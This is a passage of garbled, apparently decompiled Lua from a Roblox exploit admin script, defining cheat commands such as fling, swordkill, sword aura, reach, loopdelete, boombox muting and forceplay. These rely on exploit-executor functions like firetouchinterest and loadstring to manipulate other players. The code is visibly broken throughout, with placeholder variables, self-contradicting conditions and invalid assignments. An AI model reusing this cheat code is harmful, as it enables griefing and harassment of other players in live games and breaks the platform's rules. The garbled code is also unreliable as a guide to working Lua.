        AddConnection(va.ChildAdded:Connect(function(a)
          if not a and not a then
            firetouchinterest(a.Handle, va(), 0)
            wait()
            firetouchinterest(a.Handle, va(), 1)
            vb().Humanoid:UnequipTools()
          end
        end), c)
        return "tools will be grabbed automatically"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("unautograbtools", {
        "unloopgrabtools"
      }, "stops autograbtools", {}, function()
        va("autograbtools")
        return "auto grabtools disabled"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("droptools", {"dt"}, "drops all of your tools", {1, 3}, function()
        va():UnequipTools()
        for fe, fg in next, LocalPlayer.Backpack:GetChildren(), nil do
          if fg:IsA("Tool") and fg:FindFirstChild("Handle") then
            vb(fg, "Parent")
            fg.Parent = vc()
            fg.Parent = vd
          end
        end
        return ("dropped %d tool (s)"):format(#LocalPlayer.Backpack:GetChildren())
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("nohats", {"nh"}, "removes all the hats from your character", {3}, function()
        for fe, fg in next, va():GetAccessories() do
          fg:Destroy()
        end
        return ("removed %d hat (s)"):format(#va():GetAccessories() - #va():GetAccessories())
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("clearhats", {"ch"}, "clears all of the hats in workspace", {3}, function()
        for fd, fe in next, va():GetAccessories() do
          fe:Destroy()
        end
        for fe, fg in next, vb:GetChildren() do
          if not next and fg:FindFirstChild("Handle") then
            firetouchinterest(fg.Handle, vc(), 0)
            wait()
            firetouchinterest(fg.Handle, vc(), 1)
            vd():WaitForChild(fg.Name):Destroy()
          end
        end
        return ("cleared %d hat (s)"):format(0 + 1)
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("gravity", {"grav"}, "sets the worksapaces gravity", {"1"}, function(a, b)
        va(vb, "Gravity")
        if b then
        end
        vb.Gravity = vb.Gravity
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("nogravity", {"nograv", "ungravity"}, "removes the gravity", {}, function()
        va.Gravity = 192
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("chatmute", {"cmute"}, "mutes a player in your chat", {"1"}, function(a, b)
        for fj, fk in next, va(b[1]), nil do
          vb.DefaultChatSystemChatEvents.MutePlayerRequest:InvokeServer(fk.Name)
          vc.Notify(a, "Command", ("%s is now muted on your chat"):format(fk.Name))
        end
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("unchatmute", {"uncmute"}, "unmutes a player in your chat", {"1"}, function(a, b)
        for fj, fk in next, va(b[1]), nil do
          vb.DefaultChatSystemChatEvents.UnMutePlayerRequest:InvokeServer(fk.Name)
          vc.Notify(a, "Command", ("%s is now unmuted on your chat"):format(fk.Name))
        end
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("delete", {}, "puts a players character in lighting", {"1"}, function(a, b)
        for fh, fj in next, va(b[1]), nil do
          if not b then
            vb(fj.Character, "Parent")
            fj.Character.Parent = vc
            vd.Notify(a, "Command", fj.Name .. "'s character is now parented to lighting")
          end
        end
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("loopdelete", {"ld"}, "loop of delete command", {"1"}, function(a, b, c)
        for fj, fk in next, va(b[1]), nil do
          if not b then
            vb(fk.Character, "Parent")
            fk.Character.Parent = vc
          end
          c[fk.Name] = fk.CharacterAdded:Connect(function()
            va.Character.Parent = vb
          end)
          vd(fk, (fk.CharacterAdded:Connect(function()
            va.Character.Parent = vb
          end)))
        end
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("unloopdelete", {"unld"}, "unloop the loopdelete", {"1"}, function(a, b)
        for fj, fk in next, va(b[1]), nil do
          if vb("loopdelete").CmdExtra[fk.Name] then
            vb("loopdelete").CmdExtra[fk.Name]:Disconnect()
          end
        end
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("recover", {"undelete"}, "removes a players character parented from lighting", {"1"}, function(a, b)
        for fh, fj in next, va(b[1]), nil do
          if not b and fj.Character.Parent == vb then
            fj.Character.Parent = vc
            vd.Notify(a, "Command", fj.Name .. "'s character is now in workspace")
          else
            vd.Notify(a, "Command", fj.Name .. "'s character is not removed")
          end
        end
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("load", {"loadstring"}, "loads whatever you want", {"1"}, function(a, b)
        if b and not b then
          return pcall(function()
            loadstring(([[
%s
print(%s);
%s]]):format("local oldprint=print print=function(...)getgenv().F_A.Utils.Notify(game.Players.LocalPlayer,'Command',table.concat({...},' '))return oldprint(...)end", va, "print = oldprint"))()
          end)
        else
          return "executed with no errors"
        end
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("load2", {
        "loadstring2"
      }, "loads whatever you want but outputs in chat", {"1"}, function(a, b)
        if not pcall(function()
          loadstring(([[
%s
print(%s);
%s]]):format("local oldprint=print local oldwarn=warn;print=function(...)ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer((\"[FA] Load Output: %s\"):format(table.concat({...}, \" \")), \"All\");getgenv().F_A.Utils.Notify(game.Players.LocalPlayer,'Command',table.concat({...},' '));return oldprint(...)end warn = print", va, "print=oldprint;warn=oldwarn"))()
        end) and not b then
          vb.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(("[FA] Load: %s"):format(pcall(function()
            loadstring(([[
%s
print(%s);
%s]]):format("local oldprint=print local oldwarn=warn;print=function(...)ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer((\"[FA] Load Output: %s\"):format(table.concat({...}, \" \")), \"All\");getgenv().F_A.Utils.Notify(game.Players.LocalPlayer,'Command',table.concat({...},' '));return oldprint(...)end warn = print", va, "print=oldprint;warn=oldwarn"))()
          end)), "All")
          return pcall(function()
            loadstring(([[
%s
print(%s);
%s]]):format("local oldprint=print local oldwarn=warn;print=function(...)ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer((\"[FA] Load Output: %s\"):format(table.concat({...}, \" \")), \"All\");getgenv().F_A.Utils.Notify(game.Players.LocalPlayer,'Command',table.concat({...},' '));return oldprint(...)end warn = print", va, "print=oldprint;warn=oldwarn"))()
          end)
        else
          return "executed with no errors"
        end
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("sit", {}, "makes you sit", {3}, function(a, b, c)
        va(vb(), "Sit", false)
        vb().Sit = true
        return "now sitting (obviously)"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("infinitejump", {"infjump"}, "infinite jump no cooldown", {3}, function(a, b, c)
        AddConnection(UserInputService.JumpRequest:Connect(function()
          if not nil then
            vb((va()))
            va():ChangeState(3)
          end
        end), c)
        return "infinite jump enabled"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("noinfinitejump", {"uninfjump", "noinfjump"}, "removes infinite jump", {}, function()
        if not next(va("infjump").CmdExtra) then
          return "you are not infinite jumping"
        end
        vb("infinitejump")
        return "infinite jump disabled"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("headsit", {"hsit"}, "sits on the players head", {"1"}, function(a, b, c)
        for fj, fk in next, va(b[1]), nil do
          vc(vb(), "Sit")
          vb().Sit = true
          AddConnection(vb():GetPropertyChangedSignal("Sit"):Connect(function()
            va.Sit = true
          end), c)
          AddConnection(RunService.Heartbeat:Connect(function()
            va.CFrame = vb.Character.Head.CFrame * CFrame.new(0, 0, 1)
          end), c)
        end
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("unheadsit", {"noheadsit"}, "unheadsits on the target", {3}, function(a, b)
        for fh, fj in next, va("headsit").CmdExtra, nil do
          fj:Disconnect()
        end
        return "headsit disabled"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("headstand", {"hstand"}, "stands on a players head", {"1", 3}, function(a, b, c)
        for fk, fl in next, va(b[1]), nil do
          c[fl.Name] = RunService.Heartbeat:Connect(function()
            va.CFrame = vb.Character.Head.CFrame * CFrame.new(0, 1, 0)
          end)
          vc(fl, (RunService.Heartbeat:Connect(function()
            va.CFrame = vb.Character.Head.CFrame * CFrame.new(0, 1, 0)
          end)))
        end
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("unheadstand", {
        "noheadstand"
      }, "unheadstands on the target", {3}, function(a, b)
        for fh, fj in next, va("headstand").CmdExtra, nil do
          fj:Disconnect()
        end
        return "headstand disabled"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("setspawn", {}, "sets your spawn location to the location you are at", {3}, function(a, b, c)
        if c[1] then
          c[1]:Disconnect()
        end
        c[1] = LocalPlayer.CharacterAdded:Connect(function()
          LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = va
        end)
        vb(LocalPlayer, (LocalPlayer.CharacterAdded:Connect(function()
          LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = va
        end)))
        vc.pack(vc.unpack(tostring(va().CFrame):split(", "), 1, 3)).n = nil
        return "spawn successfully set to " .. vc.concat(vc.map(vc.pack(vc.unpack(tostring(va().CFrame):split(", "), 1, 3)), function(a, b)
          return tostring(math.round(tonumber(b)))
        end), ",")
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("removespawn", {}, "removes your spawn location", {}, function(a, b)
        if not b then
          va("setspawn").CmdExtra[1]:Disconnect()
          return "removed spawn location"
        end
        return "you don't have a spawn location set"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("ping", {}, "shows you your ping", {}, function()
        return game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString():split(" ")[1] .. "ms"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("memory", {"mem"}, "shows you your memory usage", {}, function()
        return tostring(math.round(game:GetService("Stats"):GetTotalMemoryUsageMb())) .. " mb"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("fps", {"frames"}, "shows you your framerate", {}, function()
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("displaynames", {}, "enables/disables display names (on/off)", {
        {"on", "off"}
      }, function(a, b, c)
        if b[1]:lower() == "off" then
          for fk, fl in next, Players:GetPlayers() do
            (function(a)
              if a.Name ~= a.DisplayName then
                if not a then
                  a.Character.Humanoid.DisplayName = a.Name
                end
                va[a.Name] = {
                  a.DisplayName,
                  (a.CharacterAdded:Connect(function()
                    va.Character:WaitForChild("Humanoid").DisplayName = va.Name
                  end))
                }
                vb(a, (a.CharacterAdded:Connect(function()
                  va.Character:WaitForChild("Humanoid").DisplayName = va.Name
                end)))
              end
            end)(fl)
          end
          AddConnection(Players.PlayerAdded:Connect(function(a)
            if a.Name ~= a.DisplayName then
              if not a then
                a.Character.Humanoid.DisplayName = a.Name
              end
              va[a.Name] = {
                a.DisplayName,
                (a.CharacterAdded:Connect(function()
                  va.Character:WaitForChild("Humanoid").DisplayName = va.Name
                end))
              }
              vb(a, (a.CharacterAdded:Connect(function()
                va.Character:WaitForChild("Humanoid").DisplayName = va.Name
              end)))
            end
          end))
          return "people with a displayname displaynames will be shown"
        elseif b[1]:lower() == "on" then
          for fk, fl in next, vb("displaynames").CmdExtra, nil do
            if type(fl) == "userdata" and fl.Disconnect then
              fl:Disconnect()
            else
              if not b then
                fk.Character.Humanoid.DisplayName = fl[1]
              end
              fl[2]:Disconnect()
              fl = nil
            end
          end
          return "people with a displayname displaynames will be removed"
        end
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("time", {"settime"}, "sets the games time", {
        {
          "night",
          "day",
          "dawn"
        }
      }, function(a, b)
        va(vb, "ClockTime")
        vb.ClockTime = {
          night = 0,
          day = 14,
          dawn = 6
        }[b[1] and 14] or b[1] and 14
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("fling", {}, "flings a player", {}, function(a, b)
        vc(vb(), "Velocity")
        vc(vb(), "Anchored")
        for fl, fm in next, va(b[1]), nil do
          repeat
            wait()
          until vb(fm).Position - vb(fm).Position.magnitude >= 60 or tick() - tick() > 3,5
          RunService.Stepped:Connect(function(a)
            a = a - va.DistributedGameTime
            vb.CFrame = 2 + 3
            vb.Velocity = Vector3.new(0, 1000000, 0)
          end):Disconnect()
        end
        wait()
        wait(2)
        vb().Anchored = true
        RunService.Stepped:Connect(function()
          va.Velocity = vb
          va.CFrame = vc
        end):Disconnect()
        vb().CFrame, vb().Velocity, vb().Anchored = vb().CFrame, vb().Velocity, false
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("fling2", {}, "another variant of fling", {}, function(a, b)
        vc((Instance.new("BodyAngularVelocity")))
        Instance.new("BodyAngularVelocity").MaxTorque = Vector3.new(1, 1, 1) * math.huge
        Instance.new("BodyAngularVelocity").P = math.huge
        Instance.new("BodyAngularVelocity").Parent, Instance.new("BodyAngularVelocity").AngularVelocity = vb(), Vector3.new(0, 900000, 0)
        for fo, fp in next, vd():GetChildren(), nil do
          if not b then
            fp.CanCollide = false
            fp.Massless = true
            fp.Velocity = Vector3.new(0, 0, 0)
          end
        end
        for fp, fn in next, va(b[1]), nil do
          delay(2, function()
            va = true
          end)
          repeat
            wait()
          until ve(fn) >= 60 or not b
          RunService.Stepped:Connect(function()
            va.CFrame = vb(vc).CFrame
          end):Disconnect()
        end
        Instance.new("BodyAngularVelocity"):Destroy()
        RunService.Stepped:Connect(function()
          for fd, fe in next, va, nil do
            if not va then
              fe.CanCollide = false
            end
          end
        end):Disconnect()
        for fp, fn in next, vd():GetChildren(), nil do
          if not b then
            fn.CanCollide = true
            fn.Massless = false
          end
        end
        wait(2)
        vb().Anchored = true
        RunService.Stepped:Connect(function()
          va.CFrame = vb
          va.Velocity = vc
        end):Disconnect()
        vb().CFrame, vb().Velocity, vb().Anchored = vb().CFrame, vb().Velocity, false
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("antitkill", {}, "anti tkill :troll:", {3}, function(a, b)
        va()["Right Arm"]:Destroy()
        return "lol"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("antiattach", {"anticlaim"}, "enables antiattach", {3}, function(a, b)
        for fh, fj in next, va.tbl_concat(LocalPlayer.Character:GetChildren(), LocalPlayer.Backpack:GetChildren()) do
        end
        AddConnection(LocalPlayer.Character.ChildAdded:Connect(function(a)
          if a then
            a:Destroy()
          end
        end))
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("skill", {"swordkill"}, "swordkills the user auto", {
        1,
        {"player", "manual"}
      }, function(a, b)
        if b then
        end
        LocalPlayer.Backpack:FindFirstChildOfClass("Tool") or LocalPlayer.Backpack:FindFirstChild("ClassicSword") or vb():FindFirstChild("ClassicSword") or vb():FindFirstChildOfClass("Tool").Parent = vb()
        for fo, fp in next, va(b[1]), nil do
          coroutine.wrap(function()
            if va.Character:FindFirstChild("ForceField") then
              repeat
                wait()
              until not va.Character:FindFirstChild("ForceField")
            end
            for fd = 1, 5 do
              if vb:lower() == "manual" then
                vc().CFrame = vc(va).CFrame * CFrame.new(0, -3, 0)
                vd:Activate()
                vd:Activate()
                wait()
              else
                vd:Activate()
                firetouchinterest(vd.Handle, vc(va), 0)
                wait()
                firetouchinterest(vd.Handle, vc(va), 1)
                wait()
              end
            end
            wait()
            if vb:lower() == "manual" then
              LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = ve
            end
          end)()
        end
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("reach", {"swordreach"}, "changes handle size of your tool", {1, 3}, function(a, b, c)
        c[LocalPlayer.Character:FindFirstChildWhichIsA("Tool") or LocalPlayer.Backpack:FindFirstChildWhichIsA("Tool")] = LocalPlayer.Character:FindFirstChildWhichIsA("Tool") or LocalPlayer.Backpack:FindFirstChildWhichIsA("Tool").Size
        va(LocalPlayer.Character:FindFirstChildWhichIsA("Tool") or LocalPlayer.Backpack:FindFirstChildWhichIsA("Tool").Handle, "Size")
        va(LocalPlayer.Character:FindFirstChildWhichIsA("Tool") or LocalPlayer.Backpack:FindFirstChildWhichIsA("Tool").Handle, "Massless")
        LocalPlayer.Character:FindFirstChildWhichIsA("Tool") or LocalPlayer.Backpack:FindFirstChildWhichIsA("Tool").Handle.Size = Vector3.new(LocalPlayer.Character:FindFirstChildWhichIsA("Tool") or LocalPlayer.Backpack:FindFirstChildWhichIsA("Tool").Handle.Size.X, LocalPlayer.Character:FindFirstChildWhichIsA("Tool") or LocalPlayer.Backpack:FindFirstChildWhichIsA("Tool").Handle.Size.Y, tonumber(b[1] or 2 or 30))
        LocalPlayer.Character:FindFirstChildWhichIsA("Tool") or LocalPlayer.Backpack:FindFirstChildWhichIsA("Tool").Handle.Massless = true
        return "reach on"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("noreach", {
        "noswordreach"
      }, "removes sword reach", {}, function()
        if not next(va("reach").CmdExtra) then
          return "reach isn't enabled"
        end
        for fe, fg in next, va("reach").CmdExtra, nil do
          fe.Size = fg
        end
        va("reach").CmdExtra = {}
        return "reach disabled"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("swordaura", {"saura"}, "sword aura", {3}, function(a, b, c)
        va("swordaura")
        if b then
        end
        AddConnection(RunService.Heartbeat:Connect(function()
          va = LocalPlayer.Backpack:FindFirstChildWhichIsA("Tool")
          if va and not (vb() and LocalPlayer.Backpack) then
            for fd, fe in next, vc, nil do
              if vd(fe) and not vc and ve(fe).Health ~= 0 and vg(fe) < vh and ve().Health ~= 0 then
                va.Parent = vb()
                vj.forEach(vj.filter(vb(fe):GetChildren(), function(a, b)
                  return b:IsA("BasePart")
                end), function(a, b)
                  va:Activate()
                  firetouchinterest(va.Handle, b, 0)
                  wait()
                  firetouchinterest(va.Handle, b, 1)
                end)
              end
            end
          end
        end), c)
        AddConnection(Players.PlayerAdded:Connect(function(a)
          va[2 + 1] = a
        end), c)
        AddConnection(Players.PlayerRemoving:Connect(function(a)
          va.remove(vb, va.indexOf(vb, a))
        end), c)
        return "sword aura enabled with distance " .. 10
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("noswordaura", {"noaura"}, "stops the sword aura", {}, function()
        if va("swordaura").CmdExtra then
          return "sword aura is not enabled"
        end
        vb("swordaura")
        return "sword aura disabled"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("freeze", {}, "freezes your character", {3}, function(a, b)
        for fh, fj in next, va.filter(vb(v):GetChildren(), function(a, b)
          return b:IsA("BasePart")
        end), nil do
          vc(fj, "Anchored")
          fj.Anchored = true
        end
        return "freeze enabled (client)"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("unfreeze", {}, "unfreezes your character", {3}, function(a, b)
        for fh, fj in next, va.filter(vb(v):GetChildren(), function(a, b)
          return b:IsA("BasePart")
        end), nil do
          fj.Anchored = false
        end
        return "freeze disabled"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("streamermode", {}, "changes names of everyone to something random", {}, function(a, b, c)
        vd.forEach(game:GetDescendants(), function(a, b)
          if not a and b:IsA("TextLabel") or b:IsA("TextButton") then
            if b then
            end
            b.Text = b or b.Text
            if va(b.Text:sub(2, #b.Text - 2), true) and not b then
              vb[b.Name] = b.Text
              if not b then
                Players[b.Text].Character.Humanoid.DisplayName = vc(b.Text:len())
              end
              b.Text = vc(b.Text:len())
            end
          end
        end)
        AddConnection(game.DescendantAdded:Connect(function(a)
          va(nil, a)
        end), c)
        return "streamer mode enabled"
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("nostreamermode", {
        "unstreamermode"
      }, "removes all the changed names", {}, function(a, b, c)
        for fj, fk in next, va("streamermode").CmdExtra, nil do
          if type(fk) == "userdata" and fk.Disconnect then
            fk:Disconnect()
          else
            fj.Text = fk
          end
        end
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("fireclickdetectors", {"fcd"}, "fires all the click detectors", {3}, function(a, b)
        for fj, fk in next, va:GetDescendants() do
          if fk:IsA("ClickDetector") then
            fireclickdetector(fk)
            if b[1] and 2 + 1 == tonumber(b[1]) then
              break
            end
          end
        end
        return ("fired %d amount of clickdetectors"):format(2 + 1)
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("firetouchinterests", {"fti"}, "fires all the touch interests", {3}, function(a, b)
        for fj, fk in next, va:GetDescendants() do
          if not b then
            firetouchinterest(vb(), fk.Parent, 0)
            wait()
            firetouchinterest(vb(), fk.Parent, 1)
            if not b and 2 + 1 == tonumber(b[1]) then
              break
            end
          end
        end
        return ("fired %d amount of touchtransmitters"):format(2 + 1)
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("fireproximityprompts", {"fpp"}, "fires all the proximity prompts", {3}, function(a, b)
        for fj, fk in next, va:GetDescendants() do
          if fk:IsA("ProximityPrompt") then
            fireproximityprompt(fk, 0)
            wait()
            fireproximityprompt(fk, 1)
            if b[1] and 2 + 1 == tonumber(b[1]) then
              break
            end
          end
        end
        return ("fired %d amount of proximityprompts"):format(2 + 1)
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("muteboombox", {}, "mutes a users boombox", {}, function(a, b)
        va.RespectFilteringEnabled = false
        for fh, fj in next, vb(b[1]), nil do
          for fo, fp in next, fj.Character:GetDescendants() do
            if not b then
              fp.Playing = false
            end
          end
        end
        va.RespectFilteringEnabled = true
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("loopmuteboombox", {}, "loop mutes a users boombox", {}, function(a, b, c)
        vb(vc, "RespectFilteringEnabled")
        vc.RespectFilteringEnabled = false
        for fk, fl in next, va(b[1]), nil do
          for fr, fs in next, vd.tbl_concat(vd.filter(fl.Character:GetDescendants(), function(a, b)
            return b:FindFirstChild("Handle") and b.Handle:FindFirstChildWhichIsA("Sound")
          end), vd.filter(fl.Backpack:GetChildren(), function(a, b)
            return b:FindFirstChild("Handle") and b.Handle:FindFirstChildWhichIsA("Sound")
          end)), nil do
            c[fl.Name] = true
            fs.Handle.Sound.Playing = false
            coroutine.wrap(function()
              while va("loopmuteboombox").CmdExtra[vb.Name] do
                vc.Handle.Sound.Playing = false
                RunService.Heartbeat:Wait()
                if Players or Players then
                  vd[vb.Name] = nil
                  break
                end
              end
              ve.RespectFilteringEnabled = true
            end)()
            c[fl.Name] = Connection
            vg(fl, Connection)
          end
        end
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("unloopmuteboombox", {}, "unloopmutes a persons boombox", {"1"}, function(a, b)
        for fj, fk in next, va(b[1]), nil do
          if vb("loopmuteboombox").CmdExtra[fk.Name] then
            vb("loopmuteboombox").CmdExtra[fk.Name] = nil
          end
        end
        vb("loopmuteboombox").CmdExtra = vb("loopmuteboombox").CmdExtra
      end);
      (function(a, b, c, d, e)
        if b then
        end
        return pcall(function()
          va[vb] = vc
          if type(vd) == "table" then
            for fd, fe in next, vd, nil do
              va[fe] = vc
            end
          end
        end)
      end)("forceplay", {}, "forcesplays an audio", {
        1,
        3,
        "1"
      }, function(a, b, c)
        va():UnequipTools()
        if b then
          return "you need a boombox to forceplay"
        end
        vc(vd, "RespectFilteringEnabled")
        vd.RespectFilteringEnabled = false
        vb.filter(LocalPlayer.Backpack:GetChildren(), function(a, b)
          return b:FindFirstChild("Handle") and b:IsA("Tool") and b.Handle:FindFirstChildWhichIsA("Sound")
        end)[1].Parent = ve()
        vb.filter(LocalPlayer.Backpack:GetChildren(), function(a, b)
          return b:FindFirstChild("Handle") and b:IsA("Tool") and b.Handle:FindFirstChildWhichIsA("Sound")
        end)[1].Handle.Sound.SoundId = "http://roblox.com/asset/?id=" .. b[1]
